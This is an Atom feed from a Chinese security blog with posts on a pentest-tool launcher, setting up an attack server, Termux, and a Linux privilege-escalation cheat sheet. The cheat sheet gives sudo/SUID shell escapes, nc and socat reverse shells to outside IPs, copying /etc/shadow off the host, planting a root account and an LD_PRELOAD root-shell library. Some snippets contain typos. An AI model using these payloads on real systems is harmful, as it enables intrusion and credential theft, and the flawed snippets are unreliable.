@@ -1,0 +1,3115 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://Zer0-hex.github.io</id>
+    <title>Zer0-hex&apos;s Blog</title>
+    <updated>2022-10-22T15:07:11.198Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://Zer0-hex.github.io"/>
+    <link rel="self" href="https://Zer0-hex.github.io/atom.xml"/>
+    <subtitle>What are fucking doing?</subtitle>
+    <logo>https://Zer0-hex.github.io/images/avatar.png</logo>
+    <icon>https://Zer0-hex.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2022, Zer0-hex&apos;s Blog</rights>
+    <entry>
+        <title type="html"><![CDATA[NNZ 一款模块化通用GUI界面]]></title>
+        <id>https://Zer0-hex.github.io/post/nnz-yi-kuan-mo-kuai-hua-tong-yong-gui-jie-mian/</id>
+        <link href="https://Zer0-hex.github.io/post/nnz-yi-kuan-mo-kuai-hua-tong-yong-gui-jie-mian/">
+        </link>
+        <updated>2022-10-21T20:34:31.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="nnz">NNZ</h1>
+<blockquote>
+<p>重保的告警数量还可以，写写工具，看看S12全球总决赛，慢慢长夜很快就过去了。</p>
+</blockquote>
+<h2 id="简介">简介</h2>
+<p>一款模块化工具，可以为命令行工具提供通用GUI界面。让你拥有自己喜欢的工具包。不论是在虚拟机里！还是装在U盘里！都可即插即用！</p>
+<p>技术栈：Python + tkinter + toml</p>
+<p>[+] 功能完善后再开源</p>
+<p>另外，作为一个Linuxer，我还是很喜欢终端界面的🤭</p>
+<h3 id="三个好处">三个好处</h3>
+<ol>
+<li>
+<p>好心情：在肾透厕视或者攻防演练的时候，打开各种终端窗口，然后整个电脑乱的一批，很让人烦躁，NNZ可以减轻你在这方面的痛苦。</p>
+</li>
+<li>
+<p>好简单：对于小白来说，很多工具不会用，不好学，有了前辈写好的配置文件，拿来可以直接梭哈了。</p>
+</li>
+<li>
+<p>好方便：有一天你不小心运行了一个exe，发现中招了，这个时候电脑不干净了，你左思右想还是选择了重装系统，TA可以让你一小时恢复工作状态。</p>
+</li>
+</ol>
+<h2 id="主要功能">主要功能</h2>
+<ul>
+<li>启动器 (把其他有GUI界面的工具集成一下) <sub>随便加了几个工具，没别的意思</sub></li>
+</ul>
+<figure data-type="image" tabindex="1"><img src="https://Zer0-hex.github.io/post-images/1666395334580.png" alt="" loading="lazy"></figure>
+<p>​</p>
+<ul>
+<li>渗透小工具 (现在还什么都没有，牛奶会有的，面包也会有的)</li>
+</ul>
+<figure data-type="image" tabindex="2"><img src="https://Zer0-hex.github.io/post-images/1666395344637.png" alt="" loading="lazy"></figure>
+<p>​</p>
+<ul>
+<li>命令行工具 (通用GUI界面，只需要写一份极其简单的配置文件即可，摆脱了在命令行里面切换各种目录的繁琐。)</li>
+</ul>
+<p><img src="https://Zer0-hex.github.io/post-images/1666395352056.png" alt="" loading="lazy"><br>
+​<br>
+Download：<a href="Https://github.com/zer0-hex/nnz">Github</a></p>
+<h2 id="目录与使用说明">目录与使用说明</h2>
+<blockquote>
+<p>加粗部分比较重要。</p>
+</blockquote>
+<p><strong>NNZ/</strong></p>
+<ul>
+<li>
+<p>NNZ.exe</p>
+</li>
+<li>
+<p>res/</p>
+<ul>
+<li>
+<p>env/</p>
+<ul>
+<li>
+<p>python3/</p>
+<ul>
+<li>python.exe</li>
+</ul>
+</li>
+<li>
+<p>java8/</p>
+<ul>
+<li>
+<p>bin/</p>
+<ul>
+<li>java.exe</li>
+<li>javaw.exe</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>env.toml</strong></p>
+</li>
+</ul>
+</li>
+<li>
+<p>images/</p>
+<ul>
+<li>logo.png</li>
+<li>icon.png</li>
+</ul>
+</li>
+<li>
+<p>runs/</p>
+<ul>
+<li>
+<p>BurpSuite/</p>
+<ul>
+<li>BurpSuite.bat</li>
+<li>BurpSuite.png</li>
+</ul>
+</li>
+<li>
+<p>*/</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>SecLists/</strong></p>
+</li>
+<li>
+<p><strong>simple_tools/</strong></p>
+</li>
+<li>
+<p><strong>terminal_tools/</strong></p>
+<ul>
+<li>
+<p>dirsearch/</p>
+<ul>
+<li>dirsearch.py</li>
+<li>dirsearch.toml</li>
+<li>
+<ul>
+<li></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>fscan/</p>
+<ul>
+<li>fscan.exe</li>
+<li>fscan.toml</li>
+</ul>
+</li>
+<li>
+<p>gobuster dir/</p>
+<ul>
+<li>gobuster.exe</li>
+<li>gobuster dir.toml</li>
+</ul>
+</li>
+<li>
+<p>gobuster dns/</p>
+<ul>
+<li>gobuster.exe</li>
+<li>gobuster dns.toml</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="详细介绍">详细介绍</h3>
+<ul>
+<li>NNZ/res/env/toml</li>
+</ul>
+<pre><code class="language-Config.toml"># 用于记载便携式环境的位置,主要为terminal_tools提供索引, 终端工具中有一些时exe文件，所以加个None=''表示父进程为空。
+# 此文件必须存在
+java8 = &quot;res/env/jdk8/bin/java.exe&quot;
+java11 = &quot;res/env/jdk11/bin/java.exe&quot;
+python2 = &quot;res/env/python2/python.exe&quot;
+python3 = &quot;res/env/python3/python.exe&quot;
+None = ''
+</code></pre>
+<ul>
+<li>NNZ/res/runs/BurpSuite/</li>
+</ul>
+<pre><code># 拿BurpSuite举个栗子
+NNZ/res/runs/BurpSuite/BurpSuite.bat
+NNZ/res/runs/BurpSuite/BurpSuite.png
+NNZ/res/runs/BurpSuite/BurpSuite.jar
+
+# 添加启动器的方法很简单：
+	1.在NNZ/res/runs/ 目录下面新建文件夹: [name]/；
+	2.在该文件夹下创建同名: [name].bat 文件；
+	3.在文件夹下添加图标文件 [name].png 必须是png格式；
+	4.编写bat文件，确保双击bat文件可以运行工具。
+BurpSuite.bat
+-------------
+cd /d %~dp0
+start /B javaw.exe -Xmx8G -XX:-UseParallelGC -noverify -javaagent:BurpSuiteLoader.jar -Dfile.encoding=utf-8 -jar BurpSuite.jar
+-------------
+# 这里用javaw.exe运行，可以自动创建新进程，与NNZ.exe进程分离，直接把工具的java.exe换成javaw.exe就行，Python对应的也有pythonw.exe。
+
+# 同时也可以用于启动.jar .py .exe ..... 各种类型的程序，只要双击bat能运行就可。
+
+# exe类型可以用下面的这种格式
+Clash.bat
+----------
+cd /d %~dp0
+start /b &quot;Clash&quot; &quot;Clash for Windows.exe&quot;
+----------
+
+# 环境也可以用自己添加的环境，这样方便构建自己的工具包
+Godzilla.bat
+----------
+cd /d %~dp0
+Start /b ../../env/jdk11/bin/javaw.exe -jar godzilla.jar
+----------
+
+# 也可以在文件夹下面调用子文件夹的exe文件
+AntSword.bat
+----------
+cd /d %~dp0
+start /b &quot;AntSword&quot; &quot;AntSword-Loader/AntSword.exe&quot;
+----------
+</code></pre>
+<ul>
+<li><a href="https://github.com/danielmiessler/SecLists">SecLists/</a></li>
+</ul>
+<pre><code># 字典文件，主要为其他工具提供字典，个人常用的字典主要是 https://github.com/danielmiessler/SecLists
+</code></pre>
+<ul>
+<li>simple_tools/</li>
+</ul>
+<pre><code># 这个是渗透小工具界面的目录，暂时还没开发，先留着。
+</code></pre>
+<ul>
+<li>terminal_tools/</li>
+</ul>
+<pre><code># 终端工具目录, 举几个栗子
+- terminal_tools/dirsearch/
+	- dirsearch.py
+	- dirsearch.toml	*
+	- *
+最主要的就是这个dirsearch.toml文件，一定要和目录同名，因为程序是通过目录名索引的。
+若目录名为: gobuster dir
+则配置文件名: gobuster dir.toml
+空格也要带上
+
+文件内容就是给程序写一份文档:
+name: 工具名称，直接显示在GUI界面标签上
+pname: 运行工具需要的字符串
+ppname: 运行工具所需要的环境，这里的环境不是本机的环境，是通过NNZ/res/env/env.toml文件获取到的对应环境路径。
+参数分为三种must_args(必须参数)、nomust_noinput_args(可选选项参数)、nomust_input_args(可选输入参数)
+[[must_args]]			# 必须参数
+arg_name = &quot;-u &quot;		# 参数，注意-u后面加一个空格，用于拼接。这样设计的原因是有些参数没有空格比如: --exclude-size=2kb
+arg_more = &quot;添加目标url&quot;		# 参数介绍，在GUI界面给人看的，随便写但是不要写太长了。
+arg_text = &quot;https://127.0.0.1&quot;	# 参数默认值
+arg_enable = true		# 默认是否启用
+[[nomust_noinput_args]]		# 可选选项参数
+arg_name = &quot;-q &quot;		# 参数，注意-q后面加一个空格
+arg_more = &quot;[必须开启]安静模式&quot;	# 参数介绍，（一般要关闭滚动条，否则显示会很乱）
+arg_enable = true		# 默认是否启用
+[[nomust_input_args]]		# 可选输入参数
+arg_name = &quot;-x &quot;		# 参数，注意-x后面加一个空格
+arg_more = &quot;过滤状态码&quot;		# 参数介绍
+arg_text = &quot;404,502,301&quot;	# 参数默认值
+arg_enable = true		# 默认是否启用
+
+以下为dirsearch.toml的配置文件，并没有写出所有功能，暂时只是记录了常用功能
+---------------------
+name = &quot;dirsearch&quot;
+pname = &quot;dirsearch.py&quot;
+ppname = &quot;python3&quot;		# 运行的时候通过env.toml文件获取环境路径python3 = &quot;res/env/python3/python.exe&quot;
+
+[[must_args]]
+arg_name = &quot;-u &quot;
+arg_more = &quot;添加目标url&quot;
+arg_text = &quot;https://127.0.0.1&quot;
+arg_enable = true
+
+[[nomust_noinput_args]]
+arg_name = &quot;-q &quot;
+arg_more = &quot;[必须开启]安静模式&quot;
+arg_enable = true
+
+[[nomust_noinput_args]]
+arg_name = &quot;-r &quot;
+arg_more = &quot;递归扫描&quot;
+arg_enable = false
+
+[[nomust_input_args]]
+arg_name = &quot;-x &quot;
+arg_more = &quot;过滤状态码&quot;
+arg_text = &quot;404,502,301&quot;
+arg_enable = true
+
+[[nomust_input_args]]
+arg_name = &quot;--exclude-size=&quot;	# 参数加空格的罪魁祸首
+arg_more = &quot;过滤指定大小返回包&quot;
+arg_text = &quot;2KB&quot;
+arg_enable = true
+
+[[nomust_input_args]]
+arg_name = &quot;-w &quot;
+arg_more = &quot;选择字典&quot;
+arg_text = &quot;res/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt&quot;	# 默认的字典位置，很方便的。
+arg_enable = false
+---------------------
+
+# 对于gobuster这类工具，第一个参数是选择功能模块，那么将其各个功能分开单独创建文件夹
+比如以下两个目录：
+gobuster dir/
+gobuster dns/
+其中的exe文件命名可以不更改: gobuster.exe
+在配置文件中将pname = &quot;gobuster.exe&quot;更改为：
+pname = &quot;gobuster.exe dir&quot;、
+pname = &quot;gobuster.exe dns&quot; 即可。
+</code></pre>
+<h3 id="几份现有的配置文件仅供参考">几份现有的配置文件，仅供参考</h3>
+<p>res/terminal_tools/dirsearch/dirsearch.toml</p>
+<p>res/terminal_tools/fscan/fscan.toml</p>
+<p>res/terminal_tools/ehole/ehole.toml	(该版本是Github上面拉下来最新代码自行构建的)</p>
+<p>res/terminal_tools/gobuster dir/gobuster dir.toml</p>
+<p>res/terminal_tools/gobuster dns/gobuster dns.toml</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[云服务器部署]]></title>
+        <id>https://Zer0-hex.github.io/post/yun-fu-wu-qi-bu-shu/</id>
+        <link href="https://Zer0-hex.github.io/post/yun-fu-wu-qi-bu-shu/">
+        </link>
+        <updated>2022-10-01T18:02:02.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="云服务器部署">云服务器部署</h1>
+<p>当你购买或者白嫖一台云服务器时，你需要做以下动作 (Debian 11)</p>
+<h2 id="基本设置">基本设置</h2>
+<ul>
+<li>Base</li>
+</ul>
+<pre><code># apt update &amp;&amp; apt upgrade
+# apt install zip tmux man git curl unzip perl wget ranger python openjdk-11-jdk openjdk-11-jdk-headless
+# apt install nmap sqlmap 
+
+# 增加2G虚拟内存
+# dd if=/dev/zero of=/swapfile2 bs=1M count=2048
+# chmod 0600 /swapfile2
+# mkswap /swapfile2
+# swapon /swapfile2
+# sysctl vm.swappiness=60
+# echo '/swapfile2  swap  swap  defaults' &gt;&gt; /etc/fstab
+</code></pre>
+<ul>
+<li>开发环境</li>
+</ul>
+<pre><code>$ mkdir ~/Github
+$ mkdir ~/Downloads
+$ pip config set global.index-url https://mirrors.bfsu.edu.cn/pypi/web/simple
+$ python3 -m pip install pip --upgrade
+$ cd ~/Downloads
+$ wget https://golang.google.cn/dl/go1.18.6.linux-amd64.tar.gz
+$ sudo rm -rf /usr/local/go &amp;&amp; sudo tar -C /usr/local -xzf go1.18.6.linux-amd64.tar.gz
+$ echo &quot;export PATH=\$PATH:/usr/local/go/bin&quot; &gt;&gt; ~/.bashrc
+</code></pre>
+<ul>
+<li>Docker</li>
+</ul>
+<pre><code>$ sudo apt remove docker docker-engine docker.io containerd runc
+$ sudo apt update
+$ sudo apt install apt-transport-https ca-certificates gnupg2 software-properties-common
+$ curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/debian/gpg | sudo apt-key add -
+$ sudo apt-key fingerprint 0EBFCD88
+$ sudo add-apt-repository &quot;deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://mirrors.bfsu.edu.cn/docker-ce/linux/debian $(lsb_release -cs) stable&quot;
+$ sudo apt update
+$ sudo apt install docker-ce docker-ce-cli containerd.io
+$ sudo usermod -aG docker `whoami`
+$ pip install docker-compose
+$ reboot
+</code></pre>
+<ul>
+<li>vim</li>
+</ul>
+<pre><code>$ git clone --depth=1 https://github.com/amix/vimrc.git ~/.vim_runtime
+$ sh ~/.vim_runtime/install_awesome_vimrc.sh
+</code></pre>
+<ul>
+<li>tmux</li>
+</ul>
+<pre><code>$ cd
+$ git clone https://github.com/gpakosz/.tmux.git
+$ ln -s -f .tmux/.tmux.conf
+$ cp .tmux/.tmux.conf.local .
+</code></pre>
+<h2 id="渗透环境部署">渗透环境部署</h2>
+<ul>
+<li>资产管理系统 (ARL)</li>
+</ul>
+<pre><code>$ cd ~/Github
+$ git clone https://github.com/TophantTechnology/ARL.git
+$ cd ARL/docker/
+$ docker volume create arl_db
+$ docker-compose pull
+$ docker-compose up -d 
+
+cd ~/Github &amp;&amp; git clone https://github.com/TophantTechnology/ARL.git &amp;&amp; cd ARL/docker/ &amp;&amp; docker volume create arl_db &amp;&amp; docker-compose pull &amp;&amp; docker-compose up -d 
+
+这里我比较喜欢把映射的443端口改为5003端口，因为443要留给CobaltStrike(滑稽)。
+</code></pre>
+<ul>
+<li>Vipser</li>
+</ul>
+<pre><code># 设置安装目录
+$ export VIPER_DIR=~/Github/Viper
+$ mkdir -p $VIPER_DIR &amp;&amp; cd $VIPER_DIR
+$ tee docker-compose.yml &lt;&lt;-'EOF'
+version: &quot;3&quot;
+services:
+  viper:
+    image: registry.cn-shenzhen.aliyuncs.com/toys/viper:latest
+    container_name: viper-c
+    network_mode: &quot;host&quot;
+    restart: always
+    volumes:
+      - ${PWD}/loot:/root/.msf4/loot
+      - ${PWD}/db:/root/viper/Docker/db
+      - ${PWD}/module:/root/viper/Docker/module
+      - ${PWD}/log:/root/viper/Docker/log
+      - ${PWD}/nginxconfig:/root/viper/Docker/nginxconfig
+    command: [&quot;VIPER_PASSWORD&quot;]
+EOF
+$ export VIPER_PASSWORD=Zer0-hex
+$ sed -i &quot;s/VIPER_PASSWORD/$VIPER_PASSWORD/g&quot; docker-compose.yml
+$ docker-compose config
+$ docker-compose pull
+
+# 启动viper，访问60000端口
+$ cd ~/Github/Viper &amp;&amp; docker-compose up -d
+</code></pre>
+<ul>
+<li>frp</li>
+</ul>
+<pre><code>cd ~/Github
+git clone https://github.com/fatedier/frp.git
+cd frp &amp;&amp; make
+</code></pre>
+<ul>
+<li>SecLists</li>
+</ul>
+<pre><code>$ cd ~/Github
+git clone https://github.com/danielmiessler/SecLists.git
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Linux提权]]></title>
+        <id>https://Zer0-hex.github.io/post/linux-ti-quan/</id>
+        <link href="https://Zer0-hex.github.io/post/linux-ti-quan/">
+        </link>
+        <updated>2022-09-21T02:04:06.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="linux提权">Linux提权</h1>
+<h2 id="cve提权">CVE提权</h2>
+<ul>
+<li>CVE 2021-3560 (Polkit)</li>
+<li>CVE 2021-4034 (pwnkit)</li>
+<li>CVE 2022-0847 (DirtyPipe)</li>
+</ul>
+<h3 id="利用">利用</h3>
+<pre><code>https://github.com/liamg/traitor/
+</code></pre>
+<h2 id="sudo配置提权">sudo配置提权</h2>
+<p>在Linux系统中，sudo是一个很好用的权限管理工具，它允许用户在运行某些命令时提升自己的权限。但错误的配置会导致sudo被利用与提权。</p>
+<ul>
+<li>sudo文件语法</li>
+</ul>
+<pre><code>vim /etc/sudoers
+#Username    Host=(run as)   command to execute
+root                ALL=(ALL:ALL)  ALL
+user1              ALL=(root)        NOPASSWD:/bin/find
+</code></pre>
+<ul>
+<li>查找当前用户可以执行的高权限命令</li>
+</ul>
+<pre><code>$ sudo -l
+----------------------- 一般可利的用输出结果如下所示
+$ sudo -l
+Matching Defaults entries for root on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User root may run the following commands on localhost:
+    (root) NOPASSWD: /usr/bin/perl /usr/bin/python /usr/bin/less /usr/bin/awk /usr/bin/man....
+</code></pre>
+<ul>
+<li>perl</li>
+</ul>
+<pre><code>$ sudo perl -e 'exec &quot;/bin/bash&quot;'
+</code></pre>
+<ul>
+<li>python</li>
+</ul>
+<pre><code>$ sudo python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+<ul>
+<li>less</li>
+</ul>
+<pre><code>$ sudo less /etc/hosts
+ !bash
+</code></pre>
+<ul>
+<li>awk</li>
+</ul>
+<pre><code>$ sudo awk 'BEGIN {system(&quot;/bin/bash&quot;)}'
+</code></pre>
+<ul>
+<li>man</li>
+</ul>
+<pre><code>$ sudo man man
+!bash
+</code></pre>
+<ul>
+<li>vi/vim</li>
+</ul>
+<pre><code>$ sudo vi/vim
+:!bash
+</code></pre>
+<ul>
+<li>env</li>
+</ul>
+<pre><code>sudo env /bin/bash
+</code></pre>
+<ul>
+<li>ftp</li>
+</ul>
+<pre><code>sudo ftp
+! /bin/bash
+</code></pre>
+<ul>
+<li>socat</li>
+</ul>
+<pre><code>客户机：
+socat file:`tty`,raw,echo=0 tcp-listen:1234
+受害机：
+sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.105:1234
+</code></pre>
+<ul>
+<li>scp</li>
+</ul>
+<pre><code>可以下载存放密码密文的文件
+sudo scp /etc/shadow root@192.168.1.2:~/
+</code></pre>
+<ul>
+<li>other</li>
+</ul>
+<p>有时会出现自定义的脚本被添加sudo权限的情况，对于此种情况下，如果有写权限，那么可以直接覆盖。</p>
+<h2 id="suid-提权">SUID 提权</h2>
+<p>suid可以让普通用户运行的程序以高权限运行，方便管理的同时也方便了提权。</p>
+<h3 id="查找具有suid权限的程序">查找具有SUID权限的程序</h3>
+<pre><code>find / -perm -u=s -type f 2&gt;/dev/null
+</code></pre>
+<ul>
+<li>cp</li>
+</ul>
+<pre><code>如果CP拥有SUID权限，那么有两种利用方式。
+1、利用openssl生成密码，添加新的用户到Linux的/etc/Passwd文件中
+
+openssl passwd -1 -salt hack 2333
+$1$hack$hA86ImU4cvh4bQFNvSULf1
+
+cp /etc/passwd /tmp/passwd
+本地修改文件，添加一行 &quot;hack:$1$hack$hA86ImU4cvh4bQFNvSULf1:0:0:root:/root:/bin/bash&quot;
+再上传至目标的/tmp目录下，然后使用cp命令复制到/etc/passwd文件中
+
+su hack 输入密码即可获取root权限
+
+2、利用计划任务反弹shell
+</code></pre>
+<ul>
+<li>find</li>
+</ul>
+<pre><code>touch /tmp/tmp
+find /tmp/tmp -exec &quot;whoami&quot; \;
+</code></pre>
+<ul>
+<li>vim/nano等编辑器</li>
+</ul>
+<pre><code>1、visudo命令调用vim修改/etc/sudoer文件，为当前用户添加权限，完成提权
+2、通过编辑器修改/etc/passwd文件完成提权
+3、查看/etc/shadow文件，爆破高权限用户密码。
+</code></pre>
+<ul>
+<li>bash</li>
+</ul>
+<pre><code>bash -p
+</code></pre>
+<ul>
+<li>python</li>
+</ul>
+<pre><code>import os
+os.ststem('/bin/sh')
+</code></pre>
+<h2 id="容器虚拟化工具提权">容器/虚拟化工具提权</h2>
+<p>在拥有容器权限时，可以利用容器挂载本地的目录。<br>
+通过sudoer、passwd、shadow等配置文件提权。</p>
+<ul>
+<li><a href="https://www.hackingarticles.in/lxd-privilege-escalation/">LXD</a></li>
+<li><a href="https://www.hackingarticles.in/docker-privilege-escalation/">Docker</a></li>
+</ul>
+<h2 id="计划任务">计划任务</h2>
+<p>查看计划任务中运行的脚本，如果具有写权限，即可diy脚本提权。</p>
+<h2 id="通配符注入">通配符注入</h2>
+<blockquote>
+<p>https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/</p>
+</blockquote>
+<p>条件，已知将要运行的tar 1.tar *命令</p>
+<p>例如：/etc/crontab</p>
+<pre><code>*/1 *   * * *   root tar -zcf /var/backups/html.tgz /var/www/html/*
+</code></pre>
+<p>Linux在利用通配符时，会将匹配的字符串匹配到命令中，因此可以通过修改文件名的方式，构造恶意命令。</p>
+<p>tar命令可以通过两个参数执行脚本</p>
+<pre><code>--checkpoint-action=exec=sh 1.sh&quot;
+--checkpoint=1
+</code></pre>
+<ul>
+<li>Payload-反弹Shell</li>
+</ul>
+<pre><code>echo &quot;mkfifo /tmp/lhennp; nc 192.168.1.102 8888 0&lt;/tmp/lhennp | /bin/sh &gt;/tmp/lhennp 2&gt;&amp;1; rm /tmp/lhennp&quot; &gt; shell.sh
+echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh shell.sh&quot;
+echo &quot;&quot; &gt; --checkpoint=1
+tar cf archive.tar *
+</code></pre>
+<ul>
+<li>Payload-添加SUID权限</li>
+</ul>
+<pre><code>echo &quot;chmod u+s /usr/bin/find&quot; &gt; test.sh
+echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh test.sh&quot;
+echo &quot;&quot; &gt; --checkpoint=1
+tar cf archive.tar *
+ls -al /usr/bin/find
+find f1 -exec &quot;whoami&quot; \;
+root
+find f1 -exec &quot;/bin/sh&quot; \;
+id
+whoami
+</code></pre>
+<h2 id="ld_preload劫持sudo提权有点鸡肋">LD_Preload劫持，sudo提权(有点鸡肋)</h2>
+<p>有些具高权限的命令在运行时从环境变量LD_Preload中获取链接库的位置，例如以下这些位置</p>
+<pre><code>/etc/ld.so.*
+/lib/ld-linux.so
+</code></pre>
+<p>可以通过劫持一些程序必定调用的函数，来获取Shell。<br>
+高权限的命令劫持到的Shell自然是高权限。</p>
+<ul>
+<li>payload</li>
+</ul>
+<pre><code>vim fuckld.c
+------------------------------------------------------
+#include&lt;stdlib.h&gt; 
+#include&lt;stdio.h&gt; 
+#include&lt;string.h&gt;
+__attribute__((__constructor__)) void preload (){
+    unsetenv(&quot;LD_PRELOAD&quot;);
+    setgid(0);
+    setuid(0);
+    system(&quot;/bin/sh&quot;);
+}
+</code></pre>
+<ul>
+<li>条件</li>
+</ul>
+<pre><code>sudo配置文件中添加一行
+Defaults        env_keep += LD_PRELOAD
+
+sudo -l 可以看到字样
+</code></pre>
+<ul>
+<li>利用</li>
+</ul>
+<pre><code># 编译
+gcc -shared -fPIC fuckid.c -o /tmp/fuckld.so
+# 修改环境变量
+ls LD_PRELOAD=/tmp/fuckld.so
+
+sudo LD_PRELOAD=/tmp/fuckld.so find
+</code></pre>
+<h2 id="path环境变量提权">PATH环境变量提权</h2>
+<p>有些命令具有SUID权限，并且会调用其他命令，因此可以通过劫持对应的命令来提权</p>
+<ul>
+<li>某SUID权限程序</li>
+</ul>
+<pre><code>#include&lt;unistd.h&gt;
+void main() {
+    setuid(0);
+    setgid(0);
+    system(&quot;ps&quot;);
+}
+</code></pre>
+<ul>
+<li>劫持的命令</li>
+</ul>
+<pre><code>echo &quot;/bin/bash&quot; &gt; /tmp/ps
+chmod 777 /tmp/ps
+</code></pre>
+<ul>
+<li>劫持PATH环境变量</li>
+</ul>
+<pre><code>前面的路径优先调用
+export PATH=/tmp:$PATH
+</code></pre>
+<h2 id="python库劫持">Python库劫持</h2>
+<ul>
+<li>样例文件，1.py</li>
+</ul>
+<pre><code>import goodrequests
+
+goodlib.get(&quot;baidu.com&quot;)
+</code></pre>
+<ul>
+<li>恶意库(被劫持的库)，goodrequests.py</li>
+</ul>
+<pre><code>def get():
+
+    import os
+    import pty
+    import socket
+    import subprocess
+
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect((&quot;127.0.0.1&quot;,2333))
+    os.dup2(s.fileno(),0)
+    os.dup2(s.fileno(),1)
+    os.dup2(s.fileno(),2)
+    pty.spawn(&quot;/bin/bash&quot;)
+
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Android Termux 部署随身Linux环境]]></title>
+        <id>https://Zer0-hex.github.io/post/android-termux-bu-shu-sui-shen-linux-huan-jing/</id>
+        <link href="https://Zer0-hex.github.io/post/android-termux-bu-shu-sui-shen-linux-huan-jing/">
+        </link>
+        <updated>2022-09-17T02:57:23.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="termux-便携式linux">Termux —— 便携式Linux</h1>
+<p>下载地址:<br>
+(F-Droid)[https://f-droid.org/packages/com.termux/]<br>
+(Github)[https://github.com/termux/termux-app/releases]<br>
+Google Play上的是旧版，不建议下载。</p>
+<h2 id="基本配置">基本配置</h2>
+<pre><code># 更换国内镜像源
+termux-change-repo          # 空格选中，回车OK。(建议BFSU)
+
+# 首先安装ssh，方便管理
+pkg update
+pkg install openssh vim
+
+# 修改密码
+passwd
+
+# 然后在局域网通过电脑ssh登录，用户名随意，端口8022
+ssh m@127.0.0.1 -p 8022
+
+# 更新系统
+pkg upgrade
+
+# 开启文件权限，自动映射download等基本路径，在~/storage/目录下
+termux-setup-storage
+
+# 有root权限的安装tsu，没有root权限安装proot
+# pkg install proot
+
+# 补充一下软件
+pkg install zip tmux man git curl unzip perl wget pkg-config
+pkg install openssl openssl-static libffi libffi-static libxml2 
+pkg install libpcap libgrpc libgmp libtool libxslt libsqlite
+pkg install golang clang python make cmake ruby 
+pkg install ncurses ncurses-utils ranger neofetch postgresql 
+pkg install readline findutils coreutils bison autoconf binutils apr apr-util
+pkg install termux-tools termux-elf-cleaner
+
+# 上面的全部
+pkg install  zip tmux man git curl unzip perl wget pkg-config openssl openssl-static libffi libffi-static libxml2 libpcap libgrpc libgmp libtool libxslt libsqlite golang clang python make cmake ruby ncurses ncurses-utils ranger neofetch  postgresql readline findutils coreutils bison autoconf binutils apr apr-util termux-tools  termux-elf-cleaner
+</code></pre>
+<ul>
+<li>Termux配置</li>
+</ul>
+<pre><code>虚拟键盘
+vim ~/.termux/termux.properties
+---------------------------------------------------------------------
+extra-keys = [ \
+    ['ESC','~','`','/','UP','BACKSLASH'], \
+    ['TAB','CTRL','ALT','LEFT','DOWN','RIGHT'] \
+]
+
+问候语 (https://www.bootschool.net/ascii 在线生成)
+vim $HOME/../usr/etc/motd
+----------------------------------------------------------------------
+ ████████                 ████        ██
+░░░░░░██                 █░░░██      ░██
+     ██    █████  ██████░█  █░█      ░██       █████  ██   ██
+    ██    ██░░░██░░██░░█░█ █ ░█ █████░██████  ██░░░██░░██ ██
+   ██    ░███████ ░██ ░ ░██  ░█░░░░░ ░██░░░██░███████ ░░███
+  ██     ░██░░░░  ░██   ░█   ░█      ░██  ░██░██░░░░   ██░██
+ ████████░░██████░███   ░ ████       ░██  ░██░░██████ ██ ░░██
+░░░░░░░░  ░░░░░░ ░░░     ░░░░        ░░   ░░  ░░░░░░ ░░   ░░
+</code></pre>
+<ul>
+<li>备份与恢复</li>
+</ul>
+<pre><code>备份 Termux 至手机本地Download文件夹中
+termux-setup-storage
+cd $HOME/../
+tar -jcvf /sdcard/Download/termux-backup.tar.bz2 home usr
+
+从手机本地Download文件夹中恢复Termux备份
+termux-setup-storage
+cd $HOME/../
+tar -jcvf /sdcard/Download/termux-backup.tar.bz2 --recursive-unlink --preserve-permissions
+</code></pre>
+<ul>
+<li>Bash配置 ( vim ~/.bashrc )</li>
+</ul>
+<pre><code># ~/.bashrc: executed by bash(1) for non-login shells.
+# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
+# for examples
+
+# 提示符生成器
+export PS1=&quot;\[\033[38;5;14m\][\[$(tput sgr0)\]\[\033[38;5;9m\]\w\[$(tput sgr0)\]\[$(tput sgr0)\]\[\033[38;5;216m\]\$(git branch 2&gt; /dev/null | sed -e '/^[^*]/d' -e 's/* \(.*\)/ (\1)/')\[$(tput sgr0)\]\[\033[38;5;14m\]]\[$(tput sgr0)\]\[\033[38;5;201m\]@\[$(tput sgr0)\]\[\033[38;5;11m\]Termux\[$(tput sgr0)\]\[\033[38;5;160m\]:\[$(tput sgr0)\]\[\033[38;5;10m\]\\$\[$(tput sgr0)\] &quot;
+# 命令补全(bash-completion)
+
+# 对于找不到的命令，提示软件包 影响速度
+# pacman -Sy pkgfile &amp;&amp; pkgfile --update
+# source /usr/share/doc/pkgfile/command-not-found.bash
+
+# 输入路径自动添加cd
+shopt -s autocd
+
+# 修成意外换行字符覆盖
+shopt -s checkwinsize
+
+# 历史命令添加到文件
+shopt -s histappend
+
+# 不在历史中记录重复的行和空格开头的行
+HISTCONTROL=ignoreboth
+
+# 彩色的man
+export LESS_TERMCAP_mb=$(tput bold; tput setaf 2) # green
